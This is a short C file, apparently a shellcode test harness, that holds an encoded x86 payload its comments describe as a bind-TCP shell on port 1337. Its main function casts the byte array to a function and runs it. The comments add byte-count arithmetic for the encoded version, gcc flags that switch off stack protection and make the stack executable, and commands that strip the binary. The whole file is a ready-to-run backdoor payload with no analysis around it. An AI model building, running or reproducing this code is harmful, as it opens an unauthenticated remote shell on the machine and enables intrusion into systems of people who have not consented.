#include <stdlib.h>
#include <stdio.h>

char charchar []=\
"\xda\xd6\xd9\x74\x24\xf4\x5f\x31\xc9\xb1\x0c\xeb\x08\x8a\xea\x4c\xef\xd1\x3e\x91\xfc\x0f\x6f\x47\x0d\x83\xc7\x2a\x0f\x6f\x0f\x0f\xef\xc8\x0f\x7f\x0f\x83\xc7\x08\xe2\xf2\xbb\x2a\x1c\xbf\x81\x6e\xc1\x96\xec\xb2\x26\xee\x8a\x0f\x67\xaa\xd9\x80\x4e\x66\x30\xf3\x11\xa3\x1d\x79\xfc\x89\x87\x58\xf9\xf9\xb3\x8c\x1f\x66\x30\x54\x81\xad\xdd\x63\xad\x22\x51\x8e\xf7\x4f\x8e\xbc\x1b\x66\x30\xf3\x11\x4c\xec\xa9\x1a\xb9\x86\xb7\x70\x31\x0a\xb3\x15\x5e\xd3\xad\x21\xc3\x47\x6a\x05\x96\x28\x8e\x9a\x94\xa5\xc5\x3f\x87\xb9\x11\xf3\x95\xe4\x63\xaf\xae\x58\xf4\x5c\x7c";
// 138 bytes
// bind tcp 1337
// 89 bytes original + 7 bytes alignment padding = 96
// 138 - 96 = 42 bytes
// 96 * 1.5 = 144 - 138 = 6 bytes slack remaining
// gcc -fno-stack-protector -z execstack 882_modded.c -o 882_modded.elf
// strip --strip-unneeded --strip-debug 882_modded.elf


int main(int argc, char **argv[]){
	(*(int(*)())charchar)();
}

